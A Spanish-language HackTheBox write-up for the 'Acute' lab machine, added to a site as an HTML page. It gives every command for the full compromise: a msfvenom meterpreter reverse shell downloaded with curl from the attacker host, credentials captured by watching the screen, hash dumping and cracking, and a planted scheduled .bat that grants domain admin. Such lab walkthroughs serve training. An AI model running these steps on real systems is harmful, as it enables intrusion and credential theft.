@@ -1,0 +1,350 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Acute HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/acute.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Acute HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Acute de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Acute de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Acute HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Acute HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Acute de la plataforma de HackTheBox","headline":"Writeup Acute HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Acute HackTheBox</h1>
+          <p>Resolución de la máquina Acute de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -sC 10.10.11.145
+Nmap scan report for 10.10.11.145
+443/tcp open  https
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=</span><span class="kd">atsserver.acute.local</span><span class="p">
+| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver</span>
+</code></pre></div></div>
+
+<div><p>En /about.html encontramos algunas cosas, iniciando por un texto con una posible lista de usuarios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">WHO WE WORK WITH
+Acute Health work with healthcare providers, councils and NHS units in the UK,
+training over 10,000 nurses, managers and healthcare workers every year. Some
+of our more established team members have been included for multiple awards,
+these members include </span><span class="kd">Aileen Wallace</span><span class="p">,</span><span class="kd"> Charlotte Hall</span><span class="p">,</span><span class="kd"> Evan Davies</span><span class="p">,</span><span class="kd"> Ieuan Monks</span><span class="p">,
+</span><span class="kd">Joshua Morgan</span><span class="p">, and </span><span class="kd">Lois Hopkins</span><span class="p">. Each of whom have come away with special
+accolades from the Healthcare community.</span>
+</code></pre></div></div>
+
+
+<div><p>Tomando la primera letra del nombre y el apellido nos quedaria la siguiente lista</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">AWallace
+CHall
+EDavies
+IMonks
+JMorgan
+LHopkins</span>
+</code></pre></div></div>
+
+<div><p>Además en la parte de arriba encontramos un botón "New Starter Forms" si damos clic se nos descarga un docx</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>En el docx encontramos algunas cosas, entre ellas un texto el cual dice que la contraseña predeterminada es "Password1!"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">Walk the new starter through the password change policy, they will need to
+change it from the default </span><span class="kd">Password1!</span><span class="p">. Not all staff are changing these so
+please be sure to run through this.</span>
+</code></pre></div></div>
+
+<div><p>Además otro apartado que tiene un vinculo que nos lleva a "/Acute_Staff_Access"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">Arrange for the new starter to meet with other staff in the department as
+appropriate. This could include the Head of Department and or other members
+of the appointee’s team. Complete the <a href="https://atsserver.acute.local/Acute_Staff_Access">remote</a> training</span>
+</code></pre></div></div>
+
+<div><p>Si miramos los datos con exiftool encontramos en "Description" el nombre del equipo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ exiftool</span><span class="p"> New_Starter_CheckList_v7.docx |</span><span class="s2"> grep</span><span class="p"> Description
+Description                     : Created on </span><span class="kd">Acute-PC01</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar estos datos para iniciar sesión en "/Acute_Staff_Access", como EDavies</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">Username: EDavies
+Password: Password1!
+Computer Name: Acute-PC01</span>
+</code></pre></div></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Iniciamos sesión y obtenemos una powershell, pero no en la máquina real</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Para estar desde terminal crearemos un payload .exe con msfvenom</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ msfvenom</span><span class="p"> -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe</span>
+</code></pre></div></div>
+
+<div><p>Iniciamos un servicio http y desde la máquina victima descargaremos el payload en el directorio "C:\Utils" que está en la whitelist de windows defender</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">curl 10.10.14.10/shell.exe -o shell.exe</span><span class="p">
+PS C:\Utils></span>
+</code></pre></div></div>
+
+<div><p>Ahora con msfconsole iniciaremos un listener para poder recibir la shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo msfconsole</span><span class="p">
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) </span><span class="kd">>></span><span class="p"> use exploit/multi/handler
+[</span><span class="na">*</span><span class="p">] Using configured payload generic/shell_reverse_tcp
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) exploit(</span><span class="kd">multi/handler</span><span class="p">) </span><span class="kd">>></span><span class="p"> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) exploit(</span><span class="kd">multi/handler</span><span class="p">) </span><span class="kd">>></span><span class="p"> set LHOST tun0
+LHOST => tun0
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) exploit(</span><span class="kd">multi/handler</span><span class="p">) </span><span class="kd">>></span><span class="p"> set LPORT 443
+LPORT => 443
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) exploit(</span><span class="kd">multi/handler</span><span class="p">) </span><span class="kd">>></span><span class="p"> exploit
+
+[</span><span class="na">*</span><span class="p">] Started reverse TCP handler on 10.10.14.10:443</span>
+</code></pre></div></div>
+
+<div><p>Volvemos a la powershell y ejecutamos el payload</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">.\shell.exe</span>
+</code></pre></div></div>
+
+<div><p>Ahora recibimos la conexión en nuestro listener</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">[*]</span><span class="p"> Started reverse TCP handler on 10.10.14.10:443 
+</span><span class="na">[*]</span><span class="p"> Sending stage (200262 bytes) to 10.10.11.145
+</span><span class="na">[*]</span><span class="p"> Meterpreter session 1 opened (10.10.14.10:443 -> 10.10.11.145:49789)
+
+(</span><span class="s2">Meterpreter</span><span class="na"> 1</span><span class="p">)(C:\Utils) </span><span class="kd">></span><span class="p"> getuid
+Server username: ACUTE\edavies
+(</span><span class="s2">Meterpreter</span><span class="na"> 1</span><span class="p">)(C:\Utils) </span><span class="kd">></span>
+</code></pre></div></div>
+
+<div><p>Ya que tenemos la conexión en meterpreter vamos a dar un vistazo en tiempo real</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="s2">Meterpreter</span><span class="na"> 1</span><span class="p">)(C:\Utils) </span><span class="kd">></span><span class="p"> screenshare
+</span><span class="na">[*]</span><span class="p"> Preparing player...
+</span><span class="na">[*]</span><span class="p"> Opening player at: ~/snBQttPr.html
+</span><span class="na">[*]</span><span class="p"> Streaming...</span>
+</code></pre></div></div>
+
+<div><p>Después de unos segundos el usuario abre una powershell y ejecuta unos comandos</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Aunque la calidad de la transmisión no es muy buena, logramos obtener los siguientes comandos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\edavies> </span><span class="no">$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlaintext -Force</span><span class="p">
+PS C:\Users\edavies> </span><span class="no">$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $pass)</span><span class="p">
+PS C:\Users\edavies> </span><span class="no">Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred</span>
+</code></pre></div></div>
+
+<div><p>Tomando esto como referencia podemos volver a la web, y con las credenciales conseguir el user</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlaintext -Force</span><span class="p">
+PS C:\Utils> </span><span class="no">$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $pass)</span><span class="p">
+PS C:\Utils> </span><span class="no">Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {whoami}</span><span class="p">
+acute\imonks
+PS C:\Utils> </span><span class="no">Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {cat C:\Users\imonks\Desktop\user.txt}</span><span class="p">
+594**************************ccd
+PS C:\Utils></span>
+</code></pre></div></div>
+
+<div><p>Además de la flag en el escritorio hay un .ps1 que tiene lo que parece ser "credenciales" para jmorgan</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {ls ..\Desktop}</span><span class="p">
+
+    Directory: C:\Users\imonks\Desktop
+  
+Mode                 LastWriteTime         Length Name                               PSComputerName                    
+----                 -------------         ------ ----                               --------------                    
+-ar---         22/6/2022     06:19             34 user.txt                           ATSSERVER                         
+-a----         22/6/2022     16:00            625 wm.ps1                             ATSSERVER                         
+
+PS C:\Utils> </span><span class="no">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -ScriptBlock {cat ..\Desktop\wm.ps1}</span><span class="p">
+$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4
+f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e0
+62ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
+$passwd = $securepasswd | ConvertTo-SecureString
+$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
+Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
+
+PS C:\Utils></span>
+</code></pre></div></div>
+
+<div><p>Cambiaremos el "Get-Volume" por la ruta de nuestro payload que habiamos creado para obtener shell como jmorgan</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{((cat "C:\Users\imonks\Desktop\wm.ps1" -Raw) -Replace 'Get-Volume','cmd.exe /c C:\Utils\shell.exe') | Set-Content -Path C:\Users\imonks\Desktop\wm.ps1} -Credential $cred</span><span class="p">
+PS C:\Utils></span>
+</code></pre></div></div>
+
+<div><p>De nuevo con msfconsole estaremos en escucha</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo msfconsole</span><span class="p">
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) </span><span class="kd">>></span><span class="p"> use exploit/multi/handler
+[</span><span class="na">*</span><span class="p">] Using configured payload generic/shell_reverse_tcp
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) exploit(</span><span class="kd">multi/handler</span><span class="p">) </span><span class="kd">>></span><span class="p"> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) exploit(</span><span class="kd">multi/handler</span><span class="p">) </span><span class="kd">>></span><span class="p"> set LHOST tun0
+LHOST => tun0
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) exploit(</span><span class="kd">multi/handler</span><span class="p">) </span><span class="kd">>></span><span class="p"> set LPORT 443
+LPORT => 443
+[</span><span class="s2">msf</span><span class="p">](</span><span class="no">Jobs</span><span class="p">:0 </span><span class="na">Agents</span><span class="p">:0) exploit(</span><span class="kd">multi/handler</span><span class="p">) </span><span class="kd">>></span><span class="p"> exploit
+
+[</span><span class="na">*</span><span class="p">] Started reverse TCP handler on 10.10.14.10:443</span>
+</code></pre></div></div>
+
+<div><p>Ejecutaremos el ps1 para que se ejecute el payload</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {C:\Users\imonks\Desktop\wm.ps1}</span><span class="p">
+PS C:\Utils></span>
+</code></pre></div></div>
+
+<div><p>Obtenemos una shell como nt authority\system pero en la 172.16.22.2</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">[*]</span><span class="p"> Started reverse TCP handler on 10.10.14.10:443 
+</span><span class="na">[*]</span><span class="p"> Sending stage (200262 bytes) to 10.10.11.145
+</span><span class="na">[*]</span><span class="p"> Meterpreter session 2 opened (10.10.14.10:443 -> 10.10.11.145:49790)
+
+(</span><span class="s2">Meterpreter</span><span class="na"> 2</span><span class="p">)(C:\Users\jmorgan) </span><span class="kd">></span><span class="p"> getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+(</span><span class="s2">Meterpreter</span><span class="na"> 2</span><span class="p">)(C:\Users\jmorgan) </span><span class="kd">></span><span class="p"> getuid
+Server username: </span><span class="kd">NT AUTHORITY\SYSTEM</span><span class="p">
+(</span><span class="s2">Meterpreter</span><span class="na"> 2</span><span class="p">)(C:\Users\jmorgan) </span><span class="kd">></span><span class="p"> ipconfig
+
+Interface 14
+============
+Name         : Microsoft Hyper-V Network Adapter #2
+Hardware MAC : 00:15:5d:e8:0a:01
+MTU          : 1500
+IPv4 Address : </span><span class="kd">172.16.22.2</span><span class="p">
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::9513:4361:23ec:64fd
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+(</span><span class="s2">Meterpreter</span><span class="na"> 2</span><span class="p">)(C:\Users\jmorgan) </span><span class="kd">></span>
+</code></pre></div></div>
+
+<div><p>Lo que podemos haces es dumpear los hashes y ver si logramos romper alguno que se reutilice</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="s2">Meterpreter</span><span class="na"> 2</span><span class="p">)(C:\Users\jmorgan) </span><span class="kd">></span><span class="p"> hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::</span><span class="p">
+(</span><span class="s2">Meterpreter</span><span class="na"> 2</span><span class="p">)(C:\Users\jmorgan) </span><span class="kd">></span>
+</code></pre></div></div>
+
+<div><p>Con john logramos romper el de Administrator</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+</span><span class="s2">❯ john</span><span class="p"> --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=NT
+Loaded 1 password hash (NT [MD4 128/128 XOP 4x2])
+</span><span class="kd">Password@123     </span><span class="p">(</span><span class="kd">Administrator</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>La contraseña funciona para AWallace asi que creamos la credencial y podemos ejecutar comandos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">$pass = ConvertTo-SecureString "Password@123" -AsPlainText -Force</span><span class="p">
+PS C:\Utils> </span><span class="no">$cred = New-Object System.Management.Automation.PSCredential("Acute\awallace",$pass)</span><span class="p">
+PS C:\Utils> </span><span class="no">Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {whoami}</span><span class="p">
+acute\awallace
+PS C:\Utils></span>
+</code></pre></div></div>
+
+<div><p>Si buscamos un poco en "C:\Program Files\keepmeon" encontramos un archivo .bat que contiene lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {cat 'C:\Program Files\Keepmeon\keepmeon.bat'}</span><span class="kd">
+REM</span><span class="c1"> This is run every 5 minutes. For Lois use ONLY
+</span><span class="kd">@echo</span><span class="p"> off
+</span><span class="kd"> for </span><span class="p">/R </span><span class="k">%%</span><span class="p">x </span><span class="kd">in </span><span class="p">(</span><span class="kd">*</span><span class="p">.bat)</span><span class="kd"> do</span><span class="p"> (
+</span><span class="kd"> if not </span><span class="s2">"</span><span class="k">%%</span><span class="s2">x"</span><span class="kd"> == </span><span class="s2">"</span><span class="k">%</span><span class="s2">~0" </span><span class="kd">call</span><span class="s2"> </span><span class="s2">"</span><span class="k">%%</span><span class="s2">x"
+</span><span class="p">)
+PS C:\Utils></span>
+</code></pre></div></div>
+
+<div><p>Resumiendo, cada 5 munutos ejecuta todos los .bat que existan en el directorio, sabiendo esto podemos crear nuestro .bat que nos agregue al grupo Administrators de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'C:\program files\Keepmeon\root.bat' -Value 'net group site_admin awallace /add /domain'}</span><span class="p">
+PS C:\Utils> </span><span class="no">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {cat 'C:\Program Files\Keepmeon\root.bat'}</span><span class="p">
+net group site_admin awallace /add /domain
+PS C:\Utils></span>
+</code></pre></div></div>
+
+<div><p>Ahora que vemos que tiene el contenido que queremos, queda esperar 5 minutos, pasado ese tiempo ya estamos en el grupo Administrators</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="no">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {whoami /groups}</span><span class="p">
+
+GROUP INFORMATION
+-----------------
+ 
+Group Name                                   Type             SID                                            Attributes
+                                                     
+============================================ ================ ============================================== ===============================================================
+Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Certificate Service DCOM Access      Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group             
+BUILTIN\</span><span class="kd">Administrators</span><span class="p">                       Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, </span><span class="kd">Group owner</span><span class="p">
+NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group             
+ACUTE\</span><span class="kd">Domain Admins</span><span class="p">                          Group            S-1-5-21-1786406921-1914792807-2072761762-512  Mandatory group, Enabled by default, Enabled group             
+ACUTE\Managers                               Group            S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory group, Enabled by default, Enabled group             
+ACUTE\</span><span class="kd">Site_Admin</span><span class="p">                             Group            S-1-5-21-1786406921-1914792807-2072761762-2102 Mandatory group, Enabled by default, Enabled group             
+Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group             
+ACUTE\Denied RODC Password Replication Group Alias            S-1-5-21-1786406921-1914792807-2072761762-572  Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\High Mandatory Level         Label            S-1-16-12288
+
+PS C:\Utils> </span><span class="no">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}</span><span class="p">
+0cc**************************63e
+PS C:\Utils></span>
+</code></pre></div></div>
+
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
